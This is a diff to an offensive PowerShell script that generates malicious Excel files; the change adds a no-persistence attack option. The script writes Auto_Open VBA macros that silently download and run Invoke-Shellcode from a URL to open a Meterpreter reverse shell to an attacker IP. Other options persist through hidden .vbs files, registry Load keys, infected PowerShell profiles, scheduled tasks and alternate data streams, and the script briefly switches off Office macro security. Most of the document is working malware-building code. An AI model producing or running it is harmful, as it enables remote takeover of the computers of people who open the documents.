@@ -2,42 +2,31 @@
 <#
 .SYNOPSIS
 Standalone Powershell script that will generate a malicious Microsoft Office document with a specified payload and persistence method
-
 .DESCRIPTION
 This script will generate malicious Microsoft Excel Documents that contain VBA macros. This script will prompt you for your attacking IP 
 (the one you will receive your shell at), the port you want your shell at, and the name of the document. From there, the script will then
 display a menu of different attacks, all with different persistence methods. Once an attack is chosen, it will then prompt you for your payload type
 (Only HTTP and HTTPS are supported).
-
 When naming the document, don't include a file extension.
-
 These attacks use Invoke-Shellcode, which was created by Matt Graeber. Follow him on Twitter --> @mattifestation
-
-
 .Attack Types
 Meterpreter Shell with Logon Persistence: This attack delivers a meterpreter shell and then persists in the registry 
 by creating a hidden .vbs file in C:\Users\Public and then creates a registry key in HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
 that executes the .vbs file on login.
-
 Meterpreter Shell with Powershell Profile Persistence: This attack requires the target user to have admin right but is quite creative. It will
 deliver you a shell and then drop a malicious .vbs file in C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs. Once dropped, it creates
 an infected Powershell Profile file in C:\Windows\SysNative\WindowsPowerShell\v1.0\ and then creates a registry key in 
 HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load that executes Powershell.exe on startup. Since the Powershell profile loads automatically when 
 Powershell.exe is invoked, your code is executed automatically.
-
 Meterpreter Shell with Alternate Data Stream Persistence: This attack will give you a shell and then persists my creating 2 alternate data streams attached to the AppData
 folder. It then creates a registry key that parses the Alternate Data Streams and runs the Base64 encoded payload.
-
 Meterpreter Shell with Scheduled Task Persistence: This attack will give you a shell and then persist by creating a scheduled task with the action set to
 the set payload. 
-
-
 .EXAMPLE
 PS> ./Generate-Macro.ps1
 Enter IP Address: 10.0.0.10
 Enter Port Number: 1111
 Enter the name of the document (Do not include a file extension): FinancialData
-
 --------Select Attack---------
 1. Meterpreter Shell with Logon Persistence
 2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
@@ -45,7 +34,6 @@ Enter the name of the document (Do not include a file extension): FinancialData
 4. Meterpreter Shell with Scheduled Task Persistence
 ------------------------------
 Select Attack Number & Press Enter: 1
-
 --------Select Payload---------
 1. Meterpreter Reverse HTTPS
 2. Meterpreter Reverse HTTP
@@ -53,10 +41,6 @@ Select Attack Number & Press Enter: 1
 Select Payload Number & Press Enter: 1
 Saved to file C:\Users\Malware\Desktop\FinancialData.xls
 PS>
-
-
-
-
 #>
 $global:defLoc = "$env:userprofile\Desktop"
 $global:IS_Url = Read-Host "Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version)"
@@ -65,6 +49,74 @@ $global:Port = Read-Host "Enter Port Number"
 $global:Name = Read-Host "Enter the name of the document (Do not include a file extension)"
 $global:Name = $global:Name + ".xls"
 $global:FullName = "$global:defLoc\$global:Name"
+
+function Without-Persistence {
+<#
+.SYNOPSIS
+No persistence, only execute
+.DESCRIPTION
+Execute Invoke--Shellcode in order to call home
+#>
+#create macro
+
+$Code = @"
+Sub Auto_Open()
+Execute
+End Sub
+ Public Function Execute() As Variant
+        Const HIDDEN_WINDOW = 0
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
+     End Function
+
+"@
+
+
+
+#Create excel document
+$Excel01 = New-Object -ComObject "Excel.Application"
+$ExcelVersion = $Excel01.Version
+
+#Disable Macro Security
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
+
+
+$Excel01.DisplayAlerts = $false
+$Excel01.DisplayAlerts = "wdAlertsNone"
+$Excel01.Visible = $false
+$Workbook01 = $Excel01.Workbooks.Add(1)
+$Worksheet01 = $Workbook01.WorkSheets.Item(1)
+
+$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
+$ExcelModule.CodeModule.AddFromString($Code)
+
+
+
+
+#Save the document
+Add-Type -AssemblyName Microsoft.Office.Interop.Excel
+$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
+Write-Output "Saved to file $global:Fullname"
+
+#Cleanup
+$Excel01.Workbooks.Close()
+$Excel01.Quit()
+[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
+$Excel01 = $Null
+if (ps excel){kill -name excel}
+
+#Enable Macro Security
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
+
+}
 
 function Registry-Persistence {
 <#
@@ -81,9 +133,7 @@ Execute
 Persist
 Reg
 Start
-
 End Sub
-
  Public Function Execute() As Variant
         Const HIDDEN_WINDOW = 0
         strComputer = "."
@@ -95,7 +145,6 @@ End Sub
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
         objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
-     
 Public Function Persist() As Variant
  Set fs = CreateObject("Scripting.FileSystemObject")
     Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
@@ -111,14 +160,11 @@ Public Function Persist() As Variant
     Name GivenLocation & OldFileName As GivenLocation & NewFileName
     SetAttr "C:\Users\Public\config.vbs", vbHidden
 End Function
-
 Public Function Reg() As Variant
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Public\config.vbs", "REG_SZ"
 Set WshShell = Nothing
-
 End Function
-
 Public Function Start() As Variant
  Const HIDDEN_WINDOW = 0
         strComputer = "."
@@ -194,17 +240,12 @@ $Code = @"
 'Coded by Matt Nelson
 'twitter.com/enigma0x3
 'enigma0x3.wordpress.com
-
 Sub Auto_Open()
-
 Execute
 WriteWrapper
 WriteProfile
 Reg
-
-
 End Sub
-
 Public Function Execute() As Variant
         Const HIDDEN_WINDOW = 0
         strComputer = "."
@@ -216,7 +257,6 @@ Public Function Execute() As Variant
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
         objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
-
 Public Function WriteWrapper() As Variant
 Set fs = CreateObject("Scripting.FileSystemObject")
     Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.txt", True)
@@ -231,9 +271,7 @@ Set fs = CreateObject("Scripting.FileSystemObject")
     NewFileName = "cookie.vbs"
     Name GivenLocation & OldFileName As GivenLocation & NewFileName
     SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", vbHidden
-
 End Function
-
 Public Function WriteProfile() As Variant
 Set fs = CreateObject("Scripting.FileSystemObject")
     Set a = fs.CreateTextFile("C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.txt", True)
@@ -245,14 +283,11 @@ Set fs = CreateObject("Scripting.FileSystemObject")
     Name GivenLocation & OldFileName As GivenLocation & NewFileName
     SetAttr "C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.ps1", vbHidden
 End Function
-
 Public Function Reg() As Variant
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", "REG_SZ"
 Set WshShell = Nothing
-
 End Function
-
 "@
 
 
@@ -326,15 +361,10 @@ $Code = @"
 'Coded by Matt Nelson
 'twitter.com/enigma0x3
 'enigma0x3.wordpress.com
-
 Sub Auto_Open()
-
 Execute
 Persist
-
-
 End Sub
-
 Public Function Execute() As Variant
         Const HIDDEN_WINDOW = 0
         strComputer = "."
@@ -346,8 +376,6 @@ Public Function Execute() As Variant
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
         objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
      End Function
-
-
 Public Function Persist() As Variant
         Const HIDDEN_WINDOW = 0
         strComputer = "."
@@ -359,8 +387,6 @@ Public Function Persist() As Variant
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
         objProcess.Create "Powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -ep Bypass -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
      End Function
-
-
 "@
 
 
@@ -422,15 +448,10 @@ $Code = @"
 'Coded by Matt Nelson
 'twitter.com/enigma0x3
 'enigma0x3.wordpress.com
-
 Sub Auto_Open()
-
 Execute
 ADSPersist
-
-
 End Sub
-
 Public Function Execute() As Variant
         Const HIDDEN_WINDOW = 0
         strComputer = "."
@@ -454,9 +475,6 @@ Public Function ADSPersist() As Variant
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
         objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$AltDSURL')); Invoke-ADSBackdoor -URL $global:IS_Url -Arguments 'Invoke-Shellcode -Payload $Payload -LHost $global:IP -LPort $global:Port -Force'", Null, objConfig, intProcessID
      End Function
-
-
-
 "@
 
 
@@ -508,10 +526,8 @@ Removes an alterate data stream from a specified location.
 P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.
 Author: @harmj0y, @mattifestation
 License: BSD 3-Clause
-
 .LINK
 https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
-
 #>
     [CmdletBinding()] Param(
         [Parameter(Mandatory=$True)]
@@ -546,35 +562,28 @@ https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
     $Kernel32 = $TypeBuilder.CreateType()
     
     $Result = $Kernel32::DeleteFile($ADSPath)
-
     if ($Result){
         Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
     }
     else{
         Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
     }
-
     $Result
 }
-
-
 function Remove-ADSBackdoor {
 <#
 .SYNOPSIS
 Removes the backdoor installed by Invoke-ADSBackdoor.
-
 .DESCRIPTION
 This function will remove the persistence installed by Invoke-ADSBackdoor by parsing
 the run registry run key, removing the alternate data stream files, and then
 removing the registry key.
 #>
-
     # get the VBS trigger command/file location from the registry
     $trigger = (gp HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Update).Update
     $vbsFile = $trigger.split(" ")[1]
     $getWrapperADS = {cmd /C "more <  $vbsFile"}
     $wrapper = Invoke-Command -ScriptBlock $getWrapperADS
-
     if ($wrapper -match 'i in \((.+?)\)')
     {
         # extract out the payload .txt file location
@@ -590,14 +599,12 @@ removing the registry key.
     else{
         "[!] Error: couldn't extract PowerShell script location from VBS wrapper $vbsFile"
     }
-
     if($(Remove-ADS $vbsFile)){
         "Successfully removed wrapper file $vbsFile"
     }
     else{
          "[!] Error in removing payload file $textFile"
     }
-
     # remove the registry run key
     Remove-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update;
     "Successfully removed Malicious Update entry from HKCU:Software\Microsoft\Windows\CurrentVersion\Run"
@@ -618,9 +625,10 @@ Write-Host "
 2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
 3. Meterpreter Shell with Alternate Data Stream Persistence
 4. Meterpreter Shell with Scheduled Task Persistence
+5. Meterpreter Shell without Persistence
 ------------------------------"
 $AttackNum = Read-Host -prompt "Select Attack Number & Press Enter"
-} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3" -or $AttackNum -eq "4")
+} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3" -or $AttackNum -eq "4" -or $AttackNum -eq "5")
 
 
 
@@ -639,6 +647,7 @@ $Payload = "windows/meterpreter/reverse_https"}
 elseif($PayloadNum -eq "2"){
 $Payload = "windows/meterpreter/reverse_http"}
 
+
 #Initiate Attack Choice
 
 if($AttackNum -eq "1"){
@@ -651,4 +660,7 @@ AltDS-Persistence
 }
 elseif($AttackNum -eq "4"){
 SchTaskPersistence
+}
+elseif($AttackNum -eq "5"){
+Without-Persistence
 }
